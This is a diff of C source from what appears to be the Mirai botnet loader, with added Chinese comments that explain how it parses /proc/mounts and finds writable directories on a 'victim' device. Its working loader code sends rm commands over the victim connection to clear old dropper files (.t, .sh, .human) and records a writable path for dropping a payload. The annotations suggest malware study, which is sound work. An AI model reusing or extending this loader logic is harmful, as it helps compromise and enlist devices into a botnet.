@@ -388,7 +388,15 @@ int connection_consume_psoutput(struct connection *conn)
     }
 }
 
-//cat /proc/mounts，查看挂在了哪些文件系统【之后通过执行/bin/busybox cat /proc/mounts的结果，切换到可写目录】
+//执行cat /proc/mounts，查看挂在了哪些文件系统【根据执行/bin/busybox cat /proc/mounts的结果，切换到可写目录】
+/* eg：
+spiderman@spiderman-virtual-machine:~/Downloads$ cat /proc/mounts 
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+udev /dev devtmpfs rw,nosuid,relatime,size=1977304k,nr_inodes=494326,mode=755 0 0
+devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000 0 0
+tmpfs /run tmpfs rw,nosuid,noexec,relatime,size=401588k,mode=755 0 0
+*/
 int connection_consume_mounts(struct connection *conn)
 {
     char linebuf[256];
@@ -466,30 +474,30 @@ int connection_consume_written_dirs(struct connection *conn)
     {
         char *pch;
         int pch_len;
-
+        //查看有没有kami字符,有则找了可读写的文件系统
         offset = util_memsearch(conn->rdbuf + total_offset, end_pos - total_offset, VERIFY_STRING_CHECK, strlen(VERIFY_STRING_CHECK));
         if (offset == -1)
             break;
-        total_offset += offset;
-
-        pch = strtok(conn->rdbuf + total_offset, "\n");
+        total_offset += offset; //找到了，更新offset
+        //也就是说对于一行/kami/sys，变成pch=/sys
+        pch = strtok(conn->rdbuf + total_offset, "\n"); //从kami之后为开始，以换行来切割。就是一个可读写的文件系统路径
         if (pch == NULL)
             continue;
         pch_len = strlen(pch);
 
         if (pch[pch_len - 1] == '\r')
-            pch[pch_len - 1] = 0;
+            pch[pch_len - 1] = 0;   //截断
 
-        util_sockprintf(conn->fd, "rm %s/.t; rm %s/.sh; rm %s/.human\r\n", pch, pch, pch);
+        util_sockprintf(conn->fd, "rm %s/.t; rm %s/.sh; rm %s/.human\r\n", pch, pch, pch);  //在可写目录下删除这些文件。【如果有的话】
         if (!found_writeable)
         {
             if (pch_len < 31)
             {
-                strcpy(conn->info.writedir, pch);
-                found_writeable = TRUE;
+                strcpy(conn->info.writedir, pch);   //记录victim的可写目录到conn->info.writedir
+                found_writeable = TRUE; //找到可写目录
             }
             else
-                connection_close(conn);
+                connection_close(conn); 
         }
     }
 
